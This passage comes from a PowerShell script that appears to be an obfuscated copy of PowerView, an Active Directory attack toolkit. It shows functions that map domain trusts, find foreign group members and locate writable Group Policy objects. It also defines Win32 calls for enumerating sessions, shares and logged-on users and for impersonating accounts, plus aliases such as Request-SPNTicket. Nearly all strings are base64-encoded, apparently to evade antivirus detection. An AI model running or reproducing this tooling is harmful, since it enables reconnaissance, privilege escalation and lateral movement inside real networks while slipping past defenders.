        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        $ExcludeGroups = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABVAHMAZQByAHMA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA'))))
        Get-DomainGroup @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
            $GroupName = $_.samAccountName
            $GroupDistinguishedName = $_.distinguishedname
            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
            $_.member | ForEach-Object {
                $MemberDomain = $_.SubString($_.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                if (($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwAtADEALQA1AC0AMgAxAC4AKgAtAC4AKgA=')))) -or ($GroupDomain -ne $MemberDomain)) {
                    $MemberDistinguishedName = $_
                    $MemberName = $_.Split(',')[0].split('=')[1]
                    $ForeignGroupMember = New-Object PSObject
                    $ForeignGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) $GroupDomain
                    $ForeignGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                    $ForeignGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) $GroupDistinguishedName
                    $ForeignGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $MemberDomain
                    $ForeignGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $MemberName
                    $ForeignGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) $MemberDistinguishedName
                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgA='))))
                    $ForeignGroupMember
                }
            }
        }
    }
}
function Get-DomainTrustMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    $SeenDomains = @{}
    $Domains = New-Object System.Collections.Stack
    $DomainTrustArguments = @{}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))]) { $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))] = $API }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))]) { $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))] = $NET }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
        $CurrentDomain = (Get-Domain -Credential $Credential).Name
    }
    else {
        $CurrentDomain = (Get-Domain).Name
    }
    $Domains.Push($CurrentDomain)
    while($Domains.Count -ne 0) {
        $Domain = $Domains.Pop()
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {
            Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"
            $Null = $SeenDomains.Add($Domain, '')
            try {
                $DomainTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
                $Trusts = Get-DomainTrust @DomainTrustArguments
                if ($Trusts -isnot [System.Array]) {
                    $Trusts = @($Trusts)
                }
                if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))) {
                    $ForestTrustArguments = @{}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { $ForestTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ForestTrustArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    $Trusts += Get-ForestTrust @ForestTrustArguments
                }
                if ($Trusts) {
                    if ($Trusts -isnot [System.Array]) {
                        $Trusts = @($Trusts)
                    }
                    ForEach ($Trust in $Trusts) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            $Null = $Domains.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrustMapping] Error: $_"
            }
        }
    }
}
function Get-GPODelegation {
    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    $Exclusions = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBZAFMAVABFAE0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABBAGQAbQBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEEAZABtAGkAbgBzAA=='))))
    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($Forest.Domains)
    $Domains = $DomainList | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in $Domains) {
        $Filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = $Domain
        $Searcher.Filter = $Filter
        $Searcher.PageSize = $PageSize
        $Searcher.SearchScope = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAdAByAGUAZQA=')))
        $listGPO = $Searcher.FindAll()
        foreach ($gpo in $listGPO){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA=='))) -and $_.AccessControlType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA=='))) -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAE8AUgAgAE8AVwBOAEUAUgA=')))}
        if ($ACL -ne $null){
            $GpoACL = New-Object psobject
            $GpoACL | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAFMAUABhAHQAaAA='))) $gpo.Properties.adspath
            $GpoACL | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $gpo.Properties.displayname
            $GpoACL | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) $ACL.IdentityReference
            $GpoACL | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) $ACL.ActiveDirectoryRights
            $GpoACL
        }
        }
    }
}
$Mod = New-InMemoryModule -ModuleName Win32
$SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMAA=')))
    GROUP_OBJECT                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA=')))
    NON_SECURITY_GROUP_OBJECT       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMQA=')))
    ALIAS_OBJECT                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA=')))
    NON_SECURITY_ALIAS_OBJECT       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMQA=')))
    USER_OBJECT                     =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMAA=')))
    MACHINE_ACCOUNT                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMQA=')))
    TRUST_ACCOUNT                   =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMgA=')))
    APP_BASIC_GROUP                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA=')))
    APP_QUERY_GROUP                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMQA=')))
    ACCOUNT_TYPE_MAX                =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADcAZgBmAGYAZgBmAGYAZgA=')))
}
$GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA=')))
    GLOBAL_SCOPE                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA=')))
    DOMAIN_LOCAL_SCOPE              =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA=')))
    UNIVERSAL_SCOPE                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA=')))
    APP_BASIC                       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA=')))
    APP_QUERY                       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA=')))
    SECURITY                        =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA=')))
} -Bitfield
$UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield
$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
$WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pHostName = field 4 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pUserName = field 5 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pDomainName = field 6 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pFarmName = field 7 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AFYAYQBsAEEAcgByAGEAeQA='))), 20)
}
$SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonDomain = field 1 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    AuthDomains = field 2 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonServer = field 3 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    UserName = field 1 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}
$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
$LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lgrpi1_comment = field 1 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $SID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    DnsDomainName = field 1 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $DsDomainTrustType
    TrustAttributes = field 5 $DsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}
$NETRESOURCEW = struct $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpRemoteName =    field 5 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpComment =       field 6 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpProvider =      field 7 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)
$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAA==')))
$Netapi32 = $Types[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAYQBwAGkAMwAyAA==')))]
$Advapi32 = $Types[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAA==')))]
$Wtsapi32 = $Types[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwB0AHMAYQBwAGkAMwAyAA==')))]
$Mpr = $Types[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBwAHIA')))]
$Kernel32 = $Types[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAA==')))]
Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
